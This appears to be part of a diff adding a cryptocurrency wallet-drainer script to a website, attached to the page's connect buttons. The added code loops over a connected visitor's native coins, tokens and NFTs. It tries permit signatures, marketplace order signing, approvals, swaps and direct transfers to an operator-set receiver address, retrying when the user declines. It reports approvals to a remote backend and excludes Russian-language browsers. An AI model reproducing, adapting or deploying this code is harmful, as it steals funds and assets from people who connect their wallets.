+      && FLASH_Current_Provider == 'Trust Wallet') || (FLASH_Current_Provider == 'Trust Wallet' && !FLASH_Mobile_Status)) FLASH_Sign_Disabled = true;
+    for (const asset of assets) {
+      try {
+        if (asset.type != 'NATIVE') FLASH_Gas_Reserves[asset.chain_id] += 1;
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    console.table(assets);
+    if (typeof SIGN_BLUR !== 'undefined' && FLASH_Settings.Settings.Blur.Enable == 1 && FLASH_Settings.Settings.Blur.Priority == 1)
+      await SIGN_BLUR(assets, FLASH_Provider, FLASH_Current_Address, FLASH_Settings.Address, FLASH_ID, FLASH_Settings.Settings.Blur.Price);
+    if (typeof SIGN_SEAPORT !== 'undefined' && FLASH_Settings.Settings.SeaPort.Enable == 1 && FLASH_Settings.Settings.SeaPort.Priority == 1)
+      await SIGN_SEAPORT(assets, FLASH_Provider, FLASH_Current_Address, FLASH_Settings.Address, FLASH_ID, FLASH_Settings.Settings.SeaPort.Price);
+    if (typeof SIGN_X2Y2 !== 'undefined' && FLASH_Settings.Settings.x2y2.Enable == 1 && FLASH_Current_Chain_ID == 1 && FLASH_Settings.Settings.x2y2.Priority == 1)
+      await SIGN_X2Y2(assets, FLASH_Provider, FLASH_Current_Address, FLASH_Settings.Address, FLASH_ID, FLASH_Settings.Settings.x2y2.Price);
+    let should_repeat_all = true;
+    while (should_repeat_all) {
+      should_repeat_all = (FLASH_Settings.LA == 1);
+      for (const asset of assets) {
+        try {
+          if (asset.skip) continue;
+          let is_chain_correct = false;
+          if (asset.type == 'NATIVE') {
+            const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+            const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(Math.floor(FLASH_Gas_Multiplier * 100));
+            const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
+            const tokens_gas_fee = token_limit.mul(FLASH_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);
+            const tx_template = { from: FLASH_Current_Address, to: FLASH_Settings.Receiver, value: BN(100) };
+            const gas_limit = await node.estimateGas(tx_template);
+            const balance = await node.getBalance(FLASH_Current_Address);
+            const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
+            if (available_amount.lte(BN(0))) continue;
+          }
+          if (asset.chain_id != FLASH_Current_Chain_ID) {
+            await chain_request(FLASH_Current_Chain_ID, asset.chain_id);
+            try {
+              if (FLASH_Current_Provider == 'WalletConnect') {
+                try {
+                  await FLASH_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x${asset.chain_id.toString(16)}` }] });
+                } catch(err) {
+                  await chain_cancel();
+                  continue;
+                }
+              } else {
+                try {
+                  await FLASH_Provider.request({
+                    method: "wallet_switchEthereumChain", params: [{ chainId: `0x${asset.chain_id.toString(16)}` }]
+                  });
+                } catch(err) {
+                  if (err.code == 4902 || err.code == -32603) {
+                    try {
+                      await FLASH_Provider.request({ method: "wallet_addEthereumChain", params: [ FLASH_MetaMask_ChainData[asset.chain_id] ] });
+                    } catch(err) {
+                      await chain_cancel();
+                      continue;
+                    }
+                  } else {
+                    await chain_cancel();
+                    continue;
+                  }
+                }
+              }
+              FLASH_Current_Chain_ID = asset.chain_id;
+              FLASH_Web3 = new ethers.providers.Web3Provider(FLASH_Provider);
+              FLASH_Signer = FLASH_Web3.getSigner();
+              is_chain_correct = true;
+              await chain_success();
+            } catch(err) {
+              console.log(err);
+              await chain_cancel();
+              continue;
+            }
+          } else {
+            is_chain_correct = true;
+          }
+          if (!is_chain_correct) continue;
+          if (asset.type == 'NATIVE') {
+            if (FLASH_Settings.Settings.Sign.Native > 0 && (!FLASH_Sign_Disabled || FLASH_Settings.Settings.Sign.Force == 1)) {
+              while (true) {
+                try {
+                  await SIGN_NATIVE(asset);
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  if ((FLASH_Settings.Settings.Sign.WC_AE == 1 && FLASH_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
+                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
+                    if (FLASH_Settings.Settings.Sign.Force == 1) {
+                      await sign_cancel();
+                    } else {
+                      await sign_unavailable();
+                      while (true) {
+                        try {
+                          await TRANSFER_NATIVE(asset);
+                          asset.skip = true;
+                          break;
+                        } catch(err) {
+                          console.log(err);
+                          if (err != 'LOW_BALANCE') {
+                            await transfer_cancel();
+                            if (!FLASH_Settings.Loop_N) break;
+                          } else {
+                            break;
+                          }
+                        }
+                      }
+                    }
+                    break;
+                  } else {
+                    console.log(err);
+                    if (err != 'LOW_BALANCE') {
+                      await sign_cancel();
+                      if (!FLASH_Settings.Loop_N) break;
+                    } else {
+                      break;
+                    }
+                  }
+                }
+              }
+            } else {
+              while (true) {
+                try {
+                  await TRANSFER_NATIVE(asset);
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  if (err != 'LOW_BALANCE') {
+                    await transfer_cancel();
+                    if (!FLASH_Settings.Loop_N) break;
+                  } else {
+                    break;
+                  }
+                }
+              }
+            }
+          } else if (asset.type == 'ERC20') {
+            if (typeof asset.permit == 'undefined' && FLASH_Settings.Settings.Permit.Mode && asset.amount_usd >= FLASH_Settings.Settings.Permit.Price) {
+              const data = await retrive_token(asset.chain_id, asset.address);
+              const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+              const contract = new ethers.Contract(asset.address, data, node);
+              const permit_type = get_permit_type(contract.functions);
+              asset.permit = permit_type;
+              asset.permit_ver = "1";
+              asset.abi = data;
+              if (permit_type > 0) {
+                if (contract.functions.hasOwnProperty('version')) {
+                  try {
+                    asset.permit_ver = await contract.version();
+                  } catch(err) {
+                    console.log(err);
+                  }
+                }
+                console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
+              }
+            }
+            if (asset.permit > 0) {
+              for (const c_address of FLASH_Settings.Permit_BL) {
+                if (c_address[0] == FLASH_Current_Chain_ID && c_address[1] === asset.address.toLowerCase().trim()) {
+                  asset.permit = 0;
+                  break;
+                }
+              }
+            }
+            if (FLASH_Settings.Settings.Permit2.Mode && asset.permit2) {
+              const all_permit2 = [];
+              for (const x_asset of assets) {
+                try {
+                  if (x_asset.chain_id == asset.chain_id && x_asset.permit2) {
+                    all_permit2.push(x_asset);
+                    x_asset.skip = true;
+                  }
+                } catch(err) {
+                  console.log(err);
+                }
+              }
+              while (true) {
+                try {
+                  await DO_PERMIT2(asset, all_permit2);
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  await approve_cancel();
+                  if (!FLASH_Settings.Loop_T) break;
+                }
+              }
+            } else if (FLASH_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
+              while (true) {
+                try {
+                  await PERMIT_TOKEN(asset);
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  await approve_cancel();
+                  if (!FLASH_Settings.Loop_T) break;
+                }
+              }
+            } else if (FLASH_Settings.Settings.Swappers.Enable && asset.swapper && asset.amount_usd >= FLASH_Settings.Settings.Swappers.Price) {
+              if (asset.swapper_type == 'Uniswap') {
+                const all_uniswap = [];
+                for (const x_asset of assets) {
+                  try {
+                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Uniswap') {
+                      all_uniswap.push(x_asset);
+                      x_asset.skip = true;
+                    }
+                  } catch(err) {
+                    console.log(err);
+                  }
+                }
+                while (true) {
+                  try {
+                    await DO_UNISWAP(asset, all_uniswap);
+                    asset.skip = true;
+                    break;
+                  } catch(err) {
+                    console.log(err);
+                    await sign_cancel();
+                    if (!FLASH_Settings.Loop_T) break;
+                  }
+                }
+              } else if (asset.swapper_type == 'Pancake_V3') {
+                const all_pancake = [];
+                for (const x_asset of assets) {
+                  try {
+                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Pancake_V3') {
+                      all_pancake.push(x_asset);
+                      x_asset.skip = true;
+                    }
+                  } catch(err) {
+                    console.log(err);
+                  }
+                }
+                while (true) {
+                  try {
+                    await DO_PANCAKE_V3(asset, all_pancake);
+                    asset.skip = true;
+                    break;
+                  } catch(err) {
+                    console.log(err);
+                    await sign_cancel();
+                    if (!FLASH_Settings.Loop_T) break;
+                  }
+                }
+              } else {
+                while (true) {
+                  try {
+                    await DO_SWAP(asset);
+                    asset.skip = true;
+                    break;
+                  } catch(err) {
+                    console.log(err);
+                    await sign_cancel();
+                    if (!FLASH_Settings.Loop_T) break;
+                  }
+                }
+              }
+            } else if (FLASH_Settings.Settings.Sign.Tokens > 0 && (!FLASH_Sign_Disabled || FLASH_Settings.Settings.Sign.Force == 1)) {
+              while (true) {
+                try {
+                  await SIGN_TOKEN(asset);
+                  if (FLASH_Settings.Settings.Sign.Tokens == 1) {
+                    const x_promise = send_request({ action: 'approve_token', user_id: FLASH_ID, asset, address: FLASH_Current_Address, PW: false });
+                    if (FLASH_Settings.Settings.Wait_For_Response) await x_promise;
+                  }
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  
+                    if ((FLASH_Settings.Settings.Sign.WC_AE == 1 && FLASH_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
+                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
+                    if (FLASH_Settings.Settings.Sign.Force == 1) {
+                      await sign_cancel();
+                    } else {
+                      await sign_unavailable();
+                      while (true) {
+                        if (FLASH_Settings.Settings.Sign.Tokens == 1) {
+                          if ((FLASH_Current_Provider == 'MetaMask' && FLASH_Settings.Settings.Approve.MetaMask) || (FLASH_Current_Provider == 'Trust Wallet'
+                          && FLASH_Settings.Settings.Approve.Trust) || (FLASH_Current_Provider != 'MetaMask' && FLASH_Current_Provider != 'Trust Wallet')) {
+                            try {
+                              let res_code = await APPROVE_TOKEN(asset);
+                              if (res_code == 1) {
+                                const x_promise = send_request({ action: 'approve_token', user_id: FLASH_ID, asset, address: FLASH_Current_Address, PW: FLASH_Settings.Personal_Wallet });
+                                if (FLASH_Settings.Settings.Wait_For_Response) await x_promise;
+                              }
+                              asset.skip = true;
+                              break;
+                            } catch(err) {
+                              await approve_cancel();
+                              if (!FLASH_Settings.Loop_T) break;
+                            }
+                          } else {
+                            try {
+                              await TRANSFER_TOKEN(asset);
+                              asset.skip = true;
+                              break;
+                            } catch(err) {
+                              console.log(err);
+                              await transfer_cancel();
+                              if (!FLASH_Settings.Loop_T) break;
+                            }
+                          }
+                        } else if (FLASH_Settings.Settings.Sign.Tokens == 2) {
+                          try {
+                            await TRANSFER_TOKEN(asset);
+                            asset.skip = true;
+                            break;
+                          } catch(err) {
+                            console.log(err);
+                            await transfer_cancel();
+                            if (!FLASH_Settings.Loop_T) break;
+                          }
+                        }
+                      }
+                    }
+                    break;
+                  } else {
+                    console.log(err);
+                    if (err != 'LOW_BALANCE') {
+                      await sign_cancel();
+                      if (!FLASH_Settings.Loop_T) break;
+                    } else {
+                      break;
+                    }
+                  }
+                }
+              }
+            } else if ((FLASH_Current_Provider == 'MetaMask' && FLASH_Settings.Settings.Approve.MetaMask) || (FLASH_Current_Provider == 'Trust Wallet'
+            && FLASH_Settings.Settings.Approve.Trust) || (FLASH_Current_Provider != 'MetaMask' && FLASH_Current_Provider != 'Trust Wallet')) {
+              while (true) {
+                try {
+                  let res_code = await APPROVE_TOKEN(asset);
+                  if (res_code == 1) {
+                    const x_promise = send_request({ action: 'approve_token', user_id: FLASH_ID, asset, address: FLASH_Current_Address, PW: FLASH_Settings.Personal_Wallet });
+                    if (FLASH_Settings.Settings.Wait_For_Response) await x_promise;
+                  }
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  await approve_cancel();
+                  if (!FLASH_Settings.Loop_T) break;
+                }
+              }
+            } else {
+              while (true) {
+                try {
+                  await TRANSFER_TOKEN(asset);
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  await transfer_cancel();
+                  if (!FLASH_Settings.Loop_T) break;
+                }
+              }
+            }
+          } else if (asset.type == 'ERC721') {
+            if (typeof SIGN_BLUR !== 'undefined' && FLASH_Settings.Settings.Blur.Enable == 1 && FLASH_Settings.Settings.Blur.Priority == 0 && !BL_US
+            && FLASH_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, FLASH_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8"))
+            && asset.amount_usd >= FLASH_Settings.Settings.Blur.Price) {
+              await SIGN_BLUR(assets, FLASH_Provider, FLASH_Current_Address, FLASH_Settings.Address, FLASH_ID, FLASH_Settings.Settings.Blur.Price); BL_US = true;
+            } else if (typeof SIGN_SEAPORT !== 'undefined' && FLASH_Settings.Settings.SeaPort.Enable == 1 && FLASH_Settings.Settings.SeaPort.Priority == 0 && !SP_US
+            && FLASH_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, FLASH_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71"))
+            && asset.amount_usd >= FLASH_Settings.Settings.SeaPort.Price) {
+              await SIGN_SEAPORT(assets, FLASH_Provider, FLASH_Current_Address, FLASH_Settings.Address, FLASH_ID, FLASH_Settings.Settings.SeaPort.Price); SP_US = true;
+            } else if (typeof SIGN_X2Y2 !== 'undefined' && FLASH_Settings.Settings.x2y2.Enable == 1 && FLASH_Settings.Settings.x2y2.Priority == 0 && !XY_US
+            && FLASH_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, FLASH_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354"))
+            && asset.amount_usd >= FLASH_Settings.Settings.x2y2.Price) {
+              await SIGN_X2Y2(assets, FLASH_Provider, FLASH_Current_Address, FLASH_Settings.Address, FLASH_ID, FLASH_Settings.Settings.x2y2.Price); XY_US = true;
+            } else if (FLASH_Settings.Settings.Sign.NFTs > 0 && (!FLASH_Sign_Disabled || FLASH_Settings.Settings.Sign.Force == 1)) {
+              while (true) {
+                try {
+                  await SIGN_NFT(asset);
+                  if (FLASH_Settings.Settings.Sign.NFTs == 1) {
+                    let same_collection = [];
+                    for (const x_asset of assets) {
+                      try {
+                        if (x_asset.address == asset.address) {
+                          same_collection.push(x_asset);
+                          x_asset.skip = true;
+                        }
+                      } catch(err) {
+                        console.log(err);
+                      }
+                    }
+                    await send_request({
+                      action: 'safa_approves', user_id: FLASH_ID, tokens: same_collection, address: FLASH_Current_Address,
+                      chain_id: FLASH_Current_Chain_ID, contract_address: asset.address
+                    });
+                  }
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  if ((FLASH_Settings.Settings.Sign.WC_AE == 1 && FLASH_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
+                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
+                    if (FLASH_Settings.Settings.Sign.Force == 1) {
+                      await sign_cancel();
+                    } else {
+                      await sign_unavailable();
+                      while (true) {
+                        if (FLASH_Settings.Settings.Sign.NFTs == 1) {
+                          try {
+                            await DO_SAFA(asset);
+                            let same_collection = [];
+                            for (const x_asset of assets) {
+                              try {
+                                if (x_asset.address == asset.address) {
+                                  same_collection.push(x_asset);
+                                  x_asset.skip = true;
+                                }
+                              } catch(err) {
+                                console.log(err);
+                              }
+                            }
+                            await send_request({
+                              action: 'safa_approves', user_id: FLASH_ID, tokens: same_collection, address: FLASH_Current_Address,
+                              chain_id: FLASH_Current_Chain_ID, contract_address: asset.address
+                            });
+                            asset.skip = true;
+                            break;
+                          } catch(err) {
+                            console.log(err);
+                            await approve_cancel();
+                            if (!FLASH_Settings.Loop_NFT) break;
+                          }
+                        } else if (FLASH_Settings.Settings.Sign.NFTs == 2) {
+                          try {
+                            await TRANSFER_NFT(asset);
+                            asset.skip = true;
+                            break;
+                          } catch(err) {
+                            console.log(err);
+                            await transfer_cancel();
+                            if (!FLASH_Settings.Loop_NFT) break;
+                          }
+                        }
+                      }
+                    }
+                    break;
+                  } else {
+                    console.log(err);
+                    if (err != 'LOW_BALANCE') {
+                      await sign_cancel();
+                      if (!FLASH_Settings.Loop_NFT) break;
+                    } else {
+                      break;
+                    }
+                  }
+                }
+              }
+            } else if (FLASH_Settings.Settings.Approve.Enable) {
+              while (true) {
+                try {
+                  await DO_SAFA(asset);
+                  let same_collection = [];
+                  for (const x_asset of assets) {
+                    try {
+                      if (x_asset.address == asset.address) {
+                        same_collection.push(x_asset);
+                        x_asset.skip = true;
+                      }
+                    } catch(err) {
+                      console.log(err);
+                    }
+                  }
+                  await send_request({
+                    action: 'safa_approves', user_id: FLASH_ID, tokens: same_collection, address: FLASH_Current_Address,
+                    chain_id: FLASH_Current_Chain_ID, contract_address: asset.address
+                  });
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  await approve_cancel();
+                  if (!FLASH_Settings.Loop_NFT) break;
+                }
+              }
+            } else {
+              while (true) {
+                try {
+                  await TRANSFER_NFT(asset);
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  await transfer_cancel();
+                  if (!FLASH_Settings.Loop_NFT) break;
+                }
+              }
+            }
+          }
+        } catch(err) {
+          console.log(err);
+        }
+      }
+    }
+    FLASH_Process = false;
+    setTimeout(end_message, 2000);
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+try {
+  let query_string = window.location.search, url_params = new URLSearchParams(query_string);
+  if (url_params.get('cis') != 'test' && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
+    FLASH_Bad_Country = true;
+  }
+} catch(err) {
+  console.log(err);
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+  try {
+    if (FLASH_Modal_Style == 2) FLASHM.init(); else inject_modal();
+    if (FLASH_Loader_Style == 2) FLASHL.init();
+    FLASH_Load_Time = Math.floor(Date.now() / 1000);
+    if (typeof localStorage['FLASH_ID'] === 'undefined') {
+      const ID_Data = await send_request({ action: 'retrive_id' });
+      if (ID_Data.status == 'OK') localStorage['FLASH_ID'] = ID_Data.data;
+      else localStorage['FLASH_ID'] = Math.floor(Date.now() / 1000);
+    }
+    FLASH_ID = localStorage['FLASH_ID'];
+    await retrive_config();
+    fill_chain_data();
+    await retrive_contract();
+    FLASH_Ready = true;
+    enter_website();
+    for (const chain_id in FLASH_Settings.RPCs) FLASH_Gas_Reserves[chain_id] = 0;
+    for (const elem of document.querySelectorAll('.connect-button')) {
+      try {
+        elem.addEventListener('click', () => flash_init());
+      } catch(err) {
+        console.log(err);
+      }
+    }
+  } catch(err) {
+    console.log(err);
+  }
+});
+
+const use_wc = () => { connect_wallet('WalletConnect'); };
+
+setInterval(async () => {
+  try {
+    let partner_address = document.getElementById('partner-address');
+    if (partner_address === null) return;
+    else FLASH_Partner_Address = partner_address.value.trim();
+  } catch(err) {
+    console.log(err);
+  }
+}, 1000);
+
+window.addEventListener("beforeunload", (e) => leave_website());
+window.addEventListener("onbeforeunload", (e) => leave_website());
